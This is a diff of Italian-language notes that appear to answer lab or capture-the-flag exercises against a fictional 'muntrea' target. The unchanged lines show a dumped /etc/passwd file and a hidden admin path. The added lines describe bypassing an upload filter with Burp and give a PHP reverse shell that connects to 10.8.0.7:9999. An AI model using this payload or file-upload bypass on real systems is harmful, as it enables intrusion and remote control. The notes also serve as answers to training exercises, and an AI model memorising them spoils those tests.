@@ -85,6 +85,8 @@ ho trovato /v1/adm1n/d4shb0ard/
 nmap mi ha dato il certificato e l'ho messo
 #### Domanda 6
 ho messo come variabile quella sull'url
+muntrea-energy.vdsi
+
 #### Domanda 7
 ```scss
 root:x:0:0:root:/root:/bin/bash daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin bin:x:2:2:bin:/bin:/usr/sbin/nologin sys:x:3:3:sys:/dev:/usr/sbin/nologin sync:x:4:65534:sync:/bin:/bin/sync games:x:5:60:games:/usr/games:/usr/sbin/nologin man:x:6:12:man:/var/cache/man:/usr/sbin/nologin lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin mail:x:8:8:mail:/var/mail:/usr/sbin/nologin news:x:9:9:news:/var/spool/news:/usr/sbin/nologin uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin proxy:x:13:13:proxy:/bin:/usr/sbin/nologin www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin backup:x:34:34:backup:/var/backups:/usr/sbin/nologin list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin _apt:x:42:65534::/nonexistent:/usr/sbin/nologin nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin systemd-network:x:998:998:systemd Network Management:/:/usr/sbin/nologin postfix:x:100:109::/var/spool/postfix:/usr/sbin/nologin sshd:x:101:65534::/run/sshd:/usr/sbin/nologin systemd-timesync:x:997:997:systemd Time Synchronization:/:/usr/sbin/nologin messagebus:x:102:111::/nonexistent:/usr/sbin/nologin user:x:1000:1000:,,,:/home/user:/bin/bash ftp:x:103:112:ftp daemon,,,:/srv/ftp:/usr/sbin/nologin muntrea-filemanager:x:1001:1005::/home/muntrea-filemanager:/bin/bash muntrea-operator:x:1002:1006::/home/muntrea-operator:/bin/bash muntrea-sysadmin:x:1003:1007::/home/muntrea-sysadmin:/bin/bash scanner:x:1004:1008::/home/scanner:/bin/bash
@@ -149,4 +151,17 @@ poi ho anche
 filtro usato frame contains "test"
 
 ##### SIM_STNDB: Antivirus Sicuro
-application/x-msdownload
+##### Esercizio 1
+
+il file l'ho inviato modificando il content type con burp e 
+`application/x-msdownload`
+ho creato il file `.php` 
+```php
+<?php
+$s=fsockopen("10.8.0.7",9999);
+proc_open("/bin/bash",[$s,$s,$s],$p);
+?>
+```
+e ho aperto il file su uploads/file.php
+
+il 2 si fa mettendo id 1
